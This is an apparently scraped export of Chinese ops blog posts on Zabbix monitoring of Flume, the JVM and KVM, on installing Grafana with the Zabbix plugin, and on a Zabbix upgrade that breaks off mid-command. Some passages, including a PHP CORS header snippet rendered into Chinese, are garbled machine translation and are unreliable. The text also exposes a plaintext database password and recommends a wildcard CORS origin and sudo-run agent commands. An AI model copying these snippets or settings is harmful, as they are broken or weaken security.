ganglia的监控服务，而我们目前主要使用zabbix做监控。因此，我们为Flume添加了zabbix监控模块，和sa的监控服务无缝融合。另一方面，净化Flume的metrics。只将我们需要的metrics发送给zabbix，避免 zabbix server造成压力。目前我们最为关心的是Flume能否及时把应用端发送过来的日志写到Hdfs上， 对应关注的metrics为： Source : 接收的event数和处理的event数Channel : Channel中拥堵的event数Sink : 已经处理的event数 zabbix安装&amp;JVM性能监控1234567891011121314151617181920212223242526zabbix安装http://my.oschina.net/yunnet/blog/173161JDK1.8[jollybi@countly1 conf]$ java -versionjava version \"1.8.0_65\"Java(TM) SE Runtime Environment (build 1.8.0_65-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode)#JVM性能监控Young GC counts/usr/local/jdk/bin/jstat -gcutil 87007 | tail -1 | awk '&#123;print $6&#125;'95.16Full GC counts/usr/local/jdk/bin/jstat -gcutil 87007 | tail -1 | awk '&#123;print $8&#125;'436.252JVM total memory usage/usr/local/jdk/bin/jmap -histo $(pgrep java)|grep Total | sed -n '$p' | awk '&#123;print $3&#125;'JVM total instances usage /usr/local/jdk/bin/jmap -histo $(pgrep java)|grep Total | sed -n '$p' | awk '&#123;print $2&#125;' flume应用参数监控12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849启动时加上JSON repoting参数,这样就可以通过http://localhost:34545/metrics访问bin/flume-ng agent --conf conf --conf-file conf/flume-conf-test.properties --name agent -Dflume.root.logger=INFO,console -Dflume.monitoring.type=http -Dflume.monitoring.port=34545 &amp;[root@localhost apache-flume-1.8.0-bin]# curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g'SOURCE.source1:EventReceivedCount:4871AppendBatchAcceptedCount:52Type:SOURCEEventAcceptedCount:4871AppendReceivedCount:0StartTime:1511251310062OpenConnectionCount:0AppendAcceptedCount:0AppendBatchReceivedCount:52StopTime:0SINK.sink1:ConnectionCreatedCount:0BatchCompleteCount:0BatchEmptyCount:43EventDrainAttemptCount:0StartTime:1511251311047BatchUnderflowCount:1ConnectionFailedCount:0ConnectionClosedCount:0Type:SINKRollbackCount:0EventDrainSuccessCount:4871KafkaEventSendTimer:24748StopTime:0CHANNEL.channel1:ChannelCapacity:1000ChannelFillPercentage:0.0Type:CHANNELChannelSize:0EventTakeSuccessCount:4871EventTakeAttemptCount:4915StartTime:1511251309391EventPutAttemptCount:4871EventPutSuccessCount:4871StopTime:0/opt/jdk1.8.0_101/bin/jstat 配置监控flume的脚本文件1234567891011121314vim /etc/zabbix/monitor_flume.shevent=EventDrainSuccessCount#curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep $1|awk -F: '&#123;print $2&#125;'function EventDrainSuccessCount &#123;curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep $event|awk -F: '&#123;print $2&#125;'&#125;function StartTime &#123;curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep StartTim |awk -F: '&#123;print $2&#125;' |sed -n \"2p\"&#125;function Total &#123;curl http://localhost:34545/metrics 2&gt;/dev/null|sed -e 's/\\([,]\\)\\s*/\\1\\n/g' -e 's/[&#123;&#125;]/\\n/g' -e 's/[\",]//g' |grep Total|awk -F: '&#123;print $2&#125;'&#125;#Run the requested function$1 在zabbix agent配置文件进行部署123456vim zabbix_flume_jdk.confUserParameter=ygc.counts,sudo /opt/jdk1.8.0_101/bin/jstat -gcutil $(pgrep java|head -1)|tail -1|awk '&#123;print $6&#125;'UserParameter=fgc.counts,sudo /opt/jdk1.8.0_101/bin/jstat -gcutil $(pgrep java|head -1)|tail -1|awk '&#123;print $8&#125;'UserParameter=jvm.memory.usage,sudo /opt/jdk1.8.0_101/bin/jmap -histo $(pgrep java|sed -n '$p')|grep Total | sed -n '$p' |awk '&#123;print $3&#125;'UserParameter=jvm.instances.usage,sudo /opt/jdk1.8.0_101/bin/jmap -histo $(pgrep java|sed -n '$p')|grep Total | sed -n '$p' |awk '&#123;print $2&#125;'UserParameter=flume.monitor[*],sudo /bin/bash /etc/zabbix/monitor_flume.sh $1","link":"/2017/09/21/性能监控/Zabbix/ZABBIX monitoring Flume/"},{"title":"KVM monitoring through Zabbix","text":"KVM monitoring through ZabbixMonitor your KVM resources through Zabbix Zabbix 监控 KVM 安装依赖python2, libvirt-python (tested with 0.9.12.3, 0.10.2 and 1.1.3.x) pip install libvirt-python KVM Server 设定程序123456cd /usr/local/bin/wget https://github.com/bushvin/zabbix-kvm-res/raw/master/bin/zabbix-kvm-res.pychmod a+x zabbix-kvm-res.pycd /etc/zabbix/zabbix_agentd.dwget https://github.com/bushvin/zabbix-kvm-res/raw/master/zabbix_agentd.conf/UserParametersservice zabbix-agent restart Zabbix Server 设定程序至https://github.com/bushvin/zabbix-kvm-res下载zabbix_kvm.xml将zabbix_kvm.xml 汇入至Zabbix Server → Configuration → Templates → Import 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2016/07/21/性能监控/Zabbix/Zabbix 监控 KVM集群/"},{"title":"zabbix+Grafana安装使用监控结合","text":"前言做运维的很重要的基础工作就是监控去准确定位问题，之前用的是Nagios做过监控，也用过cacti，这个之前在IDC做CDN网络方面用的比较多，监控流量好帮手。 为什么选择zabbix其实现在是算开源监控比较火的。更重要是几款监控做了对比。 cacti、zabbix同nagios一样，都是非常优势的开源监控软件。 Nagios: 轻量级/方便/快捷是nagios最大的优势，特别是它的插件机制，你可以用自己熟悉的语言实现几乎任何自己想要实现的监控。但nagios的图标图形显示的很丑，这方面的确不敢恭维。Cacti: cacti的优势表现在系统方面的监控，特别针对流量的监控功能， 以及cacti图形显示美观等，cacti在这两方面表现的都不错。Zabbix: zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。功能全面，很多公司都是基于zabbix自建的监控平台。但维护相对困难，相比没有nagios轻量及灵活。 现在sass监控，也成为企业监控的选择之一了，加上zabbix、Ganglia等，再加上APM的兴起，监控体系也越来越完善了。从基础网络监控、硬件、服务器、应用、性能，然后端到端等方面，都可以插入，但是没有一个比较完整的监控体系是可以完全胜任的，所以还需要根据自身的应用和目标去综合做选择。 前几天接触到了ELK(logstash, elasticsearch, kibana)这套日志收集展示工具集,的确很方便，这样对以后开发指定权限查看日志，可以很好管理。 这里简单说了下为什么使用zabbix, Ganglia的功能是哪些？下面有讲到。 Grafana是什么？个人认为： Grafana是一款对后端数据进行实时展示，跟elk那种差不多，非常清晰而且灵活丰富的图形化选项，可以混合多种风格，支持白天和夜间的模式，多个数据源，而跟zabbix比起来没有那么专业监控，没有那么丰富的监控功能，就是一个图像展示。 功能亮点 丰富的图形与Grafana 模板变量可以创建可重用的仪表板 官方是怎么解释Grafana的： grafana是用于可视化大型测量数据的开源程序，他提供了强大和优雅的方式去创建、共享、浏览数据。dashboard中显示了你不同metric数据源中的数据。grafana最常用于因特网基础设施和应用分析，但在其他领域也有机会用到，比如：工业传感器、家庭自动化、过程控制等等。grafana有热插拔控制面板和可扩展的数据源，目前已经支持Graphite、InfluxDB、OpenTSDB、Elasticsearch。 Grafana功能亮点1234567891011121314151617181920212223242526272829丰富的图形完全交互的，可编辑的图表。多个Y轴，对数刻度和选项。混合造型画出你的图形，你想怎么。混线，点和酒吧。混合堆叠瓦特/隔离系列。主题附带两个主题。如果你不喜欢默认的黑暗的主题，切换到光的主题。模板变量创建变量会自动填入值从您的数据库。一般可重复使用您可以在度量查询和面板标题中使用变量。重复面板自动重复每个选定的变量值的行或面板。数据源支持Graphite，Elasticsearch，Prometheus，InfluxDB，OpenTSDB和KairosDB开箱。或使用插件功能来添加自己的。认证管理用户，角色和组织。通过LDAP，基本验证与认证代理注释注释与datasouces包括Elasticsearch，石墨和InfluxDB丰富的活动图快照共享创建和共享在1点击一个完全交互式图表和只有你的团队或全世界分享。 Grafana官网Granfana官网：http://grafana.org Granfana官网安装参考文档安装文档：http://docs.grafana.org/installation/ grafana和LDAP集成：LDAP集成：http://docs.grafana.org/installation/ldap/ grafana演示站点grafana演示站点: http://play.grafana.org/ 3.0版本关于Grafana-zabbix插件官方文档：Grafana-zabbix插件安装官方使用文档 官网下载地址Download Grafana:Download Grafana 安装Grafana 温馨提示： 12grafana的版本和grafana-zabbix的版本必须匹配，否则会出现异常。本文以grafana2.5版本为例讲解，如果后面grafana和grafana-zabbix更新，需要将2个版本匹配即可。 现在最新版本是3.0版本，我们可以试试安装在基于RPM的Linux版本（CentOS，Fedora的，OpenSuse当中，红帽） 安装最新稳定版： 1sudo yum install https://grafanarel.s3.amazonaws.com/builds/grafana-3.1.0-1468321182.x86_64.rpm 如果被墙，可以到我github上面下载：Grafana 这里需要安装下依赖包： 12$ sudo yum install initscripts fontconfig$ sudo rpm -Uvh grafana-3.1.0-1468321182.x86_64.rpm 或者选择YUM方式安装： 1234567891011vim etc/yum.repos.d/grafana.repo[grafana]name=grafanabaseurl=https://packagecloud.io/grafana/stable/el/6/$basearchrepo_gpgcheck=1enabled=1gpgcheck=1gpgkey=https://packagecloud.io/gpg.key https://grafanarel.s3.amazonaws.com/RPM-GPG-KEY-grafanasslverify=1sslcacert=/etc/pki/tls/certs/ca-bundle.crt 还有，如果你想测试版或发布候选测试存储库。 1baseurl=https://packagecloud.io/grafana/testing/el/6/$basearch 然后通过安装Grafana yum的命令。 1$ sudo yum install grafana RPM GPG密钥RPM包进行签名，可以验证这个签名公共GPG密钥。 包装细节 安装二进制文件到 /usr/sbin/grafana-server 副本的init.d脚本/etc/init.d/grafana-server 默认的安装文件环境，以在/etc/sysconfig/grafana-server 拷贝配置文件/etc/grafana/grafana.ini 安装systemd服务（如果systemd可用）名称grafana-server.service 默认配置使用的日志文件在/var/log/grafana/grafana.log 默认配置指定以sqlite3的数据库/var/lib/grafana/grafana.db 启动服务（的init.d服务） 1$ sudo service grafana-server start 这将启动grafana服务进程作为grafana用户，这是包安装过程中创建。默认HTTP端口是 3000，和默认的用户和组管理。 要配置服务器Grafana在启动时启动： 1sudo /sbin/chkconfig --add grafana-server centos 7 系统启动服务： 123$ systemctl daemon-reload$ systemctl start grafana-server$ systemctl status grafana-server centos 7 设置开机启动 1sudo systemctl enable grafana-server.service 环境文件该systemd服务文件和脚本的init.d都使用位于文件 在/etc/sysconfig/grafana服务启动后端时所使用的环境变量。在这里，您可以覆盖日志目录，数据目录和其他变量。 记录默认情况下Grafana将记录到的/var/log/grafana 数据库默认配置指定位于一个sqlite3的数据库 /var/lib/grafana/grafana.db。请备份升级之前，这个数据库。你也可以使用MySQL或者Postgres作为Grafana数据库上详述配置页面。 组态该配置文件位于/etc/grafana/grafana.ini.去配置页面上的所有这些选项的详细信息。 配置http://docs.grafana.org/installation/configuration/#database 配置文件里分段给出了非常详细的说明，非常人性化 默认使用的是sqlite3的，这里我调整为自己MySQL的。 1.创建数据库和用户12345678mysql&gt; CREATE DATABASE grafana DEFAULT CHARACTER SET utf8;Query OK, 1 row affected (0.02 sec)mysql&gt; GRANT ALL ON grafana.* TO grafana@'192.168.1.%' IDENTIFIED BY 'haozhuo.com' WITH GRANT OPTION;Query OK, 0 rows affected (0.26 sec)mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.02 sec) 2.指定数据库及认证信息cp /etc/grafana/grafana.ini{,.default}vim /etc/grafana/grafana.ini 配置文件： 1234567891011121314151617[database]# Either \"mysql\", \"postgres\" or \"sqlite3\", it's your choicetype = mysqlhost = 192.168.1.201:3306name = grafanauser = grafanapassword = haozhuo.com[session]# Either \"memory\", \"file\", \"redis\", \"mysql\", \"postgres\", default is \"file\"provider = redisprovider_config = addr=127.0.0.1:6379,pool_size=100,db=grafana cookie_name = grafana_sesscookie_secure = false session_life_time = 86400 grafana.ini 配置文件详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143app_mode：应用名称，默认是production[path]data：一个grafana用来存储sqlite3、临时文件、回话的地址路径logs：grafana存储logs的路径[server]http_addr：监听的ip地址，，默认是0.0.0.0http_port：监听的端口，默认是3000protocol：http或者https，，默认是httpdomain：这个设置是root_url的一部分，当你通过浏览器访问grafana时的公开的domian名称，默认是localhostenforce_domain：如果主机的header不匹配domian，则跳转到一个正确的domain上，默认是falseroot_url：这是一个web上访问grafana的全路径url，默认是%(protocol)s://%(domain)s:%(http_port)s/router_logging：是否记录web请求日志，默认是falsecert_file：如果使用https则需要设置cert_key：如果使用https则需要设置[database]grafana默认需要使用数据库存储用户和dashboard信息，默认使用sqlite3来存储，你也可以换成其他数据库type：可以是mysql、postgres、sqlite3，默认是sqlite3path：只是sqlite3需要，定义sqlite3的存储路径host：只是mysql、postgres需要，默认是127.0.0.1:3306name：grafana的数据库名称，默认是grafanauser：连接数据库的用户password：数据库用户的密码ssl_mode：只是postgres使用[security]admin_user：grafana默认的admin用户，默认是adminadmin_password：grafana admin的默认密码，默认是adminlogin_remember_days：多少天内保持登录状态secret_key：保持登录状态的签名disable_gravatar：[users]allow_sign_up：是否允许普通用户登录，如果设置为false，则禁止用户登录，默认是true，则admin可以创建用户，并登录grafanaallow_org_create：如果设置为false，则禁止用户创建新组织，默认是trueauto_assign_org：当设置为true的时候，会自动的把新增用户增加到id为1的组织中，当设置为false的时候，新建用户的时候会新增一个组织auto_assign_org_role：新建用户附加的规则，默认是Viewer，还可以是Admin、Editor[auth.anonymous]enabled：设置为true，则开启允许匿名访问，默认是falseorg_name：为匿名用户设置组织名称org_role：为匿名用户设置的访问规则，默认是Viewer[auth.github]针对github项目的，很明显，呵呵enabled = falseallow_sign_up = falseclient_id = some_idclient_secret = some_secretscopes = user:emailauth_url = https://github.com/login/oauth/authorizetoken_url = https://github.com/login/oauth/access_tokenapi_url = https://api.github.com/userteam_ids =allowed_domains =allowed_organizations =[auth.google]针对google app的，呵呵enabled = falseallow_sign_up = falseclient_id = some_client_idclient_secret = some_client_secretscopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.emailauth_url = https://accounts.google.com/o/oauth2/authtoken_url = https://accounts.google.com/o/oauth2/tokenapi_url = https://www.googleapis.com/oauth2/v1/userinfoallowed_domains =[auth.basic]enabled：当设置为true，则http api开启基本认证[auth.ldap]enabled：设置为true则开启LDAP认证，默认是falseconfig_file：如果开启LDAP，指定LDAP的配置文件/etc/grafana/ldap.toml[auth.proxy]允许你在一个HTTP反向代理上进行认证设置enabled：默认是falseheader_name：默认是X-WEBAUTH-USERheader_property：默认是个名称usernameauto_sign_up：默认是true。开启自动注册，如果用户在grafana DB中不存在[analytics]reporting_enabled：如果设置为true，则会发送匿名使用分析到stats.grafana.org，主要用于跟踪允许实例、版本、dashboard、错误统计。默认是truegoogle_analytics_ua_id：使用GA进行分析，填写你的GA ID即可[dashboards.json]如果你有一个系统自动产生json格式的dashboard，则可以开启这个特性试试enabled：默认是falsepath：一个全路径用来包含你的json dashboard，默认是/var/lib/grafana/dashboards[session]provider：默认是file，值还可以是memory、mysql、postgresprovider_config：这个值的配置由provider的设置来确定，如果provider是file，则是data/xxxx路径类型，如果provider是mysql，则是user:password@tcp(127.0.0.1:3306)/database_name，如果provider是postgres，则是user=a password=b host=localhost port=5432 dbname=c sslmode=disablecookie_name：grafana的cookie名称cookie_secure：如果设置为true，则grafana依赖https，默认是falsesession_life_time：session过期时间，默认是86400秒，24小时以下是官方文档没有，配置文件中有的[smtp]enabled = falsehost = localhost:25user =password =cert_file =key_file =skip_verify = falsefrom_address = admin@grafana.localhost[emails]welcome_email_on_sign_up = falsetemplates_pattern = emails/*.html[log]mode：可以是console、file，默认是console、file，也可以设置多个，用逗号隔开buffer_len：channel的buffer长度，默认是10000level：可以是\"Trace\", \"Debug\", \"Info\", \"Warn\", \"Error\", \"Critical\"，默认是info[log.console]level：设置级别[log.file]level：设置级别log_rotate：是否开启自动轮转max_lines：单个日志文件的最大行数，默认是1000000max_lines_shift：单个日志文件的最大大小，默认是28，表示256MBdaily_rotate：每天是否进行日志轮转，默认是truemax_days：日志过期时间，默认是7,7天后删除 3.重启grafanaservice grafana-server restarttail -f /var/log/grafana/grafana.log 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061[root@LAN_zabbix ~]# tail -f /var/log/grafana/grafana.logt=2016-07-14T00:49:01+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table dashboard to dashboard_v1 - v1\"t=2016-07-14T00:49:01+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_dashboard_org_id - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_org_id_slug - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy dashboard v1 to v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop table dashboard_v1\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"alter dashboard.data to mediumtext v1\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column updated_by in dashboard - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column created_by in dashboard - v2\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column gnetId in dashboard\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add index for gnetId in dashboard\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create data_source table\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index data_source.account_id\"t=2016-07-14T00:49:02+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add unique index data_source.account_id_name\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index IDX_data_source_account_id - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_data_source_account_id_name - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table data_source to data_source_v1 - v1\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create data_source table v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_data_source_org_id - v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_data_source_org_id_name - v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy data_source v1 to v2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table data_source_v1 #2\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Add column with_credentials\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create api_key table\"t=2016-07-14T00:49:03+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.account_id\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.key\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"add index api_key.account_id_name\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index IDX_api_key_account_id - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_api_key_key - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop index UQE_api_key_account_id_name - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Rename table api_key to api_key_v1 - v1\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create api_key table v2\"t=2016-07-14T00:49:04+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_api_key_org_id - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_api_key_key - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_api_key_org_id_name - v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"copy api_key v1 to v2\"t=2016-07-14T00:49:05+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table api_key_v1\"t=2016-07-14T00:49:06+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard_snapshot table v4\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop table dashboard_snapshot_v4 #1\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create dashboard_snapshot table v5 #2\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_snapshot_key - v5\"t=2016-07-14T00:49:18+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_dashboard_snapshot_delete_key - v5\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index IDX_dashboard_snapshot_user_id - v5\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"alter dashboard_snapshot to mediumtext v2\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create quota table v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_quota_org_id_user_id_target - v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create plugin_setting table\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create index UQE_plugin_setting_org_id_plugin_id - v1\"t=2016-07-14T00:49:19+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create session table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table playlist table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"Drop old table playlist_item table\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create playlist table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create playlist item table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop preferences table v2\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"drop preferences table v3\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Executing migration\" logger=migrator id=\"create preferences table v3\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Created default admin user: [admin]\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Starting plugin search\" logger=pluginst=2016-07-14T00:49:20+0800 lvl=eror msg=\"Plugins: Failed to load plugin json file: [/usr/share/grafana/public/app/plugins/datasource/zabbix/plugin.json invalid character '\\\"' after object key:value pair], err: %!v(MISSING)\"t=2016-07-14T00:49:20+0800 lvl=info msg=\"Server Listening\" logger=server address=0.0.0.0:3000 protocol=http subUrl= logger=server address=0.0.0.0:3000 protocol=http Dashboardweb: http://192.168.1.220:3000 默认用户名:admin 默认用户名密码:admin 登录后一片空白，所以需要安装相应插件。 grafana-zabbix插件12345https://github.com/alexanderzobnin/grafana-zabbixhttp://play.grafana-zabbix.org/http://docs.grafana-zabbix.org/installation/http://docs.grafana-zabbix.org/installation/configuration/https://grafana.net/plugins/alexanderzobnin-zabbix-app/installation 1.安装插件 官网讲的非常详细参考链接：http://docs.grafana-zabbix.org/installation/ 12345678[root@LAN_zabbix ~]# grafana-cli plugins install alexanderzobnin-zabbix-appinstalling alexanderzobnin-zabbix-app @ 3.0.0from url: https://grafana.net/api/plugins/alexanderzobnin-zabbix-app/versions/3.0.0/downloadinto: /var/lib/grafana/plugins✔ Installed alexanderzobnin-zabbix-app successfullyRestart grafana after installing plugins . &lt;service grafana-server restart&gt; 然后在登陆查看，这里已经安装上zabbix插件了。 三、grafana使用grafana的仪表和zabbix的监控差不多，基本是先创建监控模板、监控项，然后再添加仪表。这里先建立数据源，再创建仪表对象，并添加模板，最后添加仪表。 可参考：https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage 组态启用插件 转到Grafana侧面板插件，选择应用程序选项卡，然后选择的zabbix，打开配置 选项卡并启用插件。 1.配置zabbix数据源 启用插件后可以添加的zabbix数据源。 要添加新的zabbix数据源公开数据源在侧面板中，单击添加数据源，并选择的zabbix从下拉列表中。 http://192.168.1.220/zabbix/api_jsonrpc.php 注意: api_jsonrpc.php是zabbix的API调用接口 HTTP设置 网址：设置的zabbix API URL（完整路径api_jsonrpc.php）。 访问： 代理：通过Grafana后端访问 直接：从浏览器访问。 HTTP认证：配置如果使用代理验证。 基本认证： 凭据：代理访问意味着Grafana后端将代理从浏览器的所有请求，并送他们到数据源。这是有用的，因为它可以消除CORS（跨产地站点资源）的问题，以及消除需要​​宣传认证细节数据源到浏览器。 直接访问仍然支持，因为在某些情况下，可能是有用的直接访问数据源取决于Grafana，用户，和数据源的使用情况和拓扑。 ZABBIX API细节 用户和密码：设置登录访问的zabbix API。同时检查用户的权限的zabbix如果你不能得到任何组和主机的Grafana。 趋势：启用如果您使用的zabbix 3.x或补丁中的zabbix 2.x的趋势支撑（ZBXNEXT-1193）。此选项严格推荐用于显示时间长周期（超过几天，在不同的zabbix您的项目的更新间隔的），因为项目历史几天包含吨的点。使用趋势将增加Grafana性能。 从使用趋势之后的趋势将被使用的时间。默认值是7天（7天）。您可以在Grafana格式的时间。有效时间specificators是： ^ h -小时 ð -天 中号 -个月 缓存更新间隔：插件缓存提高性能的一些API请求。将该值设置为所需的缓存生存期（此选项影响类的物品列表数据）。然后单击添加 -数据源将被添加，您可以使用检查连接 测试连接按钮。此功能可以帮助找到一些错误，类似于无效的用户名或密码，错误的API网址。 导入示例仪表板您可以从仪表盘导入示例仪表板选项卡中的插件配置。 请注意有关的zabbix 2.2或更低ZABBIX 2.4之前的zabbix API（api_jsonrpc.php）不允许跨域请求（CORS）。你可以得到HTTP错误412（预处理失败）。要修复它添加此代码的版权后，立即api_jsonrpc.php： 12345678910111213 标题（“访问控制允许来源：*'）; 标题（“访问控制允许信头：Content-Type的'）;标题（“访问控制允许的方法：POST'）;标题（“访问控制，最大年龄：1000'）;如果（$ _ SERVER [ 'REQUEST_METHOD' ] === '选项'）&#123; 返回 ; &#125; 之前 12require_once dirname( __FILE__ ). '/include/func.inc.php' ;require_once dirname( __FILE__ ). '/include/classes/core/CHttpRequest.php' ; 完全修复上市。欲了解更多详情，请参见ZABBIX发出ZBXNEXT-1377 和ZBX-8459。请注意有关浏览器缓存 更新插件，清除浏览器缓存和重新加载应用程序页面后。详情请参见铬， 火狐。您需要清除缓存而已，没有Cookie，历史记录和其他数据。 升级从2.X升级后启用的zabbix应用到数据源，打开你的配置的zabbix数据源端选择的zabbix从类型列表中再次。这是必要的，因为插件ID在Grafana 3.0改变。 参考官网配置数据源：http://docs.grafana-zabbix.org/installation/configuration/ ###入门Grafana-zabbix 你经过安装和配置Grafana-zabbix数据源，让我们创建一个简单的仪表板。 下面是自带的模板，自己新建的模板在我github上面有详细的创建步骤。 入门gafana创建仪表板：Grafana-github 可参考：https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","link":"/2016/06/17/性能监控/Zabbix/zabbix-Grafana安装使用结合/"},{"title":"zabbix-server2.4全新升级3.0版本","text":"zabbix3.0出来了一段时间了，最近忍不住把公司原来的2.4.7版本升级到了3.0。zabbix升级其实很简单，基本步骤为：备份-&gt;重新安装新版本。接下来简单写下这次升级的操作和问题 1、 关闭zabbix server防止有新的数据提交到数据库中、直接关闭数据库效果也是一样的。这里我先关闭掉我的服务： 12/etc/init.d/zabbix_server stop 关闭了server服务端/etc/init.d/zabbix_agentd stop 关闭了agent客户端 2、 备份2.1 备份数据库最简单的备份：关闭数据，整个数据库目录copy一份。虽说升级一般不会出现什么问题，但是安全起见还是有必要备份一下，就算升级成功，但是不能保证新版本让你喜欢，这个时候回退也有后路。 这里我用的是命令导出的：也可以用NAvicat，导出结构和数据。 12345678910111213141516mysqldump -u root -p***** -h 